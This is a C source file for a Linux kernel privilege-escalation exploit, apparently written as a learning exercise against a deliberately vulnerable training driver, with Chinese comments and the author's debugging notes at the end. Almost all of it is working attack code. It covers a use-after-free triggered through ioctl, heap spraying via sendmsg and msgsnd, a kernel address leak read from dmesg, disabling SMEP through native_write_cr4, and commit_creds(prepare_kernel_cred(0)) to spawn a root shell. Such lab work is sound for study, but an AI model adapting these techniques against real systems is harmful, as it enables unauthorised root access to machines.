#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include "vuln_driver.h"
#define BUFF_SIZE 96
#define PATH "/dev/vulnerable_device"

// UAF 对象
typedef struct uaf_obj
{
	char uaf_first_buff[56];
	long arg;
	void (*fn)(long);
	char uaf_second_buff[12];
};

//让程序只在单核上运行，以免只关闭了1个核的smep，却在另1个核上跑shell
void force_single_core()
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0,&mask);

	if (sched_setaffinity(0,sizeof(mask),&mask))
		printf("[-----] Error setting affinity to core0, continue anyway, exploit may fault \n");
	return;
}

//用sendmsg构造堆喷，一个通用接口搞定，只需传入待执行的目标地址+参数
void use_after_free_sendmsg(int fd, size_t target, size_t arg)
{
	char buff[BUFF_SIZE];
	struct msghdr msg={0};
	struct sockaddr_in addr={0};
	int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    // 布置堆喷数据
	memset(buff,0x43,sizeof buff);
	memcpy(buff+56,&arg,sizeof(long));
	memcpy(buff+56+(sizeof(long)),&target,sizeof(long));

	addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
	addr.sin_family=AF_INET;
	addr.sin_port=htons(6666);

	// buff是堆喷射的数据，BUFF_SIZE是最后要调用KMALLOC申请的大小
	msg.msg_control=buff;
	msg.msg_controllen=BUFF_SIZE;
	msg.msg_name=(caddr_t)&addr;
	msg.msg_namelen= sizeof(addr);
	// 构造UAF对象
	ioctl(fd,ALLOC_UAF_OBJ,NULL);
	ioctl(fd,FREE_UAF_OBJ,NULL);
	//开始堆喷
	for (int i=0;i<10000;i++){
		sendmsg(sockfd,&msg,0);
	}
	//触发
	ioctl(fd,TEST_USE_UAF_OBJ,NULL);
	//ioctl(fd,USE_UAF_OBJ,NULL);
}

//用msgsnd构造堆喷
int use_after_free_msgsnd(int fd, size_t target, size_t arg)
{
	int new_len=BUFF_SIZE-48;
	struct {
		size_t mtype;
		char mtext[new_len];
	} msg;
	//布置堆喷数据
	memset(msg.mtext,0x42,new_len-1);
	memcpy(msg.mtext+56-48,&arg,sizeof(long));
	memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
	msg.mtext[new_len]=0;
	msg.mtype=1; //mtype必须 大于0

	// 创建消息队列
	int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
	// 构造UAF对象
	ioctl(fd, ALLOC_UAF_OBJ,NULL);
	ioctl(fd,FREE_UAF_OBJ,NULL);
	//开始堆喷
	for (int i=0;i<120;i++)
		msgsnd(msqid,&msg,sizeof(msg.mtext),0);
	//触发
	ioctl(fd,TEST_USE_UAF_OBJ,NULL);
	//ioctl(fd,USE_UAF_OBJ,NULL);
}

// 触发page_fault 泄露kernel基址
void do_page_fault()
{
	size_t info_leak_magic=0x41414141deadbeef; //0x41414141deadbeef  0xffffffffffe39dd7  //只要是无法访问的地址就行，触发page_fault
	int child_fd=open(PATH,O_RDWR);
	use_after_free_msgsnd(child_fd, info_leak_magic, 0); //触发执行info_leak_magic地址处的代码
	//use_after_free_sendmsg(child_fd, info_leak_magic, 0);
	return ;
}

//从dmesg读取打印信息，泄露kernel基址
#define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '{print $3}' | cut -d '<' -f 2 | cut -d '>' -f 1 > /tmp/infoleak"
size_t get_info_leak()
{
	system(GREP_INFOLEAK);
	size_t addr=0;
	FILE *fd=fopen("/tmp/infoleak","r");
	fscanf(fd,"%lx",&addr);
	fclose(fd);
	return addr;
}

size_t prepare_kernel_cred_addr=0xa6ca0;
size_t commit_creds_addr=0xa68b0;
size_t native_write_cr4_addr=0x65a30;
size_t sys_ioctl_offset=0x22bc59;
size_t fake_cr4=0x407f0;

void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred_addr;
	void (*cc)(char*) = commit_creds_addr;
	(*cc)((*pkc)(0));
}

int main()
{
	// step 1: 只允许在单核上运行
	force_single_core();

	int fd = open("/dev/vulnerable_device", O_RDWR);
	if (fd<0){
		printf("[-] Open error!\n");
		return 0;
	}
	ioctl(fd,DRIVER_TEST,NULL);  //用于标识dmesg中字符串的开始

	// step 2: 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
	 //pid_t pid=fork();
	// if (pid==0){
	// 	do_page_fault();
	// 	exit(0);
	// }
	// int status;
	// wait(&status);    // 等子进程结束
	 //sleep(10);
	// printf("[+] Begin to leak address by dmesg![+]\n");
	 //size_t kernel_base = get_info_leak()-sys_ioctl_offset;
	// printf("[+] Kernel base addr : %p [+] \n", kernel_base);

	 //native_write_cr4_addr+=kernel_base;
	 //prepare_kernel_cred_addr+=kernel_base;
	 //commit_creds_addr+=kernel_base;
	native_write_cr4_addr=0xffffffff81064560;
	prepare_kernel_cred_addr=0xffffffff810a25b0;
	commit_creds_addr=0xffffffff810a21c0;
	printf("[+] We can get 3 important function address ![+]\n");
	printf("        native_write_cr4_addr = %p\n",native_write_cr4_addr);
	printf("        prepare_kernel_cred_addr = %p\n",prepare_kernel_cred_addr);
	printf("        commit_creds_addr = %p\n",commit_creds_addr);

	// step 3: 关闭smep,并提权
	//use_after_free_sendmsg(fd,native_write_cr4_addr,fake_cr4);
	//use_after_free_sendmsg(fd,get_root,0);   //MMAP_ADDR
	use_after_free_msgsnd(fd,native_write_cr4_addr,fake_cr4);
	use_after_free_msgsnd(fd,get_root,0);  //MMAP_ADDR

	// step 4: 获得shell
	if (getuid()==0)
	{
		printf("[+] Congratulations! You get root shell !!! [+]\n");
		system("/bin/sh");
	}

	close(fd);
	return 0;
}
/*
[+] Kernel base addr : 0xffffffffffdd43a7 [+] 
[+] We can get 3 important function address ![+]
        native_write_cr4_addr = 0xffffffffffe39dd7
        prepare_kernel_cred_addr = 0xffffffffffe7b047
        commit_creds_addr = 0xffffffffffe7ac57

问题1：
 报错：执行0x100000000000处的内容时产生pagefault，可能是访问0x1000002ce8fd地址出错
 gdb-peda$ x /10i $pc
=> 0x100000000000:	push   rbp
   0x100000000001:	mov    rbp,rsp
   0x100000000004:	push   rbx
   0x100000000005:	sub    rsp,0x8
   0x100000000009:	
    mov    rbx,QWORD PTR [rip+0x2ce8ed]        # 0x1000002ce8fd
   0x100000000010:	
    mov    rax,QWORD PTR [rip+0x2ce8ee]        # 0x1000002ce905
   0x100000000017:	mov    edi,0x0
   0x10000000001c:	call   rax
   0x10000000001e:	mov    rdi,rax
   0x100000000021:	call   rbx

[   10.421887] BUG: unable to handle kernel paging request at 00001000002ce8fd
[   10.424836] IP: [<0000100000000009>] 0x100000000009

问题2：
	普通用户权限1000下，不能触发page_fault，所以不能靠dmesg泄露kernel地址。我怀疑是内核的保护机制，在普通用户权限下不会因为pagefault而打印出内核基址。

调试：
ALLOC_UAF_OBJ
.text:0000000000000402                 call    kmem_cache_alloc_trace
USE_UAF_OBJ
.text:0000000000000486                 mov     rdi, [rax+38h]
.text:000000000000048A                 mov     rax, [rax+40h]
.text:000000000000048E                 call    __x86_indirect_thunk_rax

.bss:0000000000001148 global_uaf_obj
$ cat /sys/module/vuln_driver/sections/.text
0xffffffffc0008000
0xffffffffc0000000


*/
